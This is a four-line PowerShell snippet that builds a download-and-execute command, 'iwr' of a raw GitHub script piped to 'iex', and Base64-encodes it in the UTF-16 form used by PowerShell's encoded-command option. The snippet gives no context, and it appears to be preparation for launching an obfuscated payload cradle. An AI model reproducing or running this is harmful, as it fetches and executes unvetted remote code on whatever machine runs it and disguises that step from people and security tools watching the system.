$Text = ‘iwr raw.githubusercontent.com/Clickest/a/master/complete|iex’
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText